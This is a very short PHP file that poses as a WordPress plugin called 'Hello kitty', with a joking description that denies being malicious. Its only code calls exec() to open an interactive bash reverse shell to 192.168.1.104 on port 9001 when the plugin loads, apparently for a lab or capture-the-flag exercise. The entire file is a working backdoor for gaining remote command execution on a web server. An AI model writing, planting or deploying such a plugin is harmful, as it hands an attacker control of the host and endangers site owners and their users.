<?php
/**
* Plugin Name: Hello kitty
* Plugin URI:
* Description: Definitely not a malicious plugin (i think )
* Version: 1337.0
* Author: Zeyad Abuqasem
* Author URI: https://hackers.org
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.104/9001 0>&1'")
?>
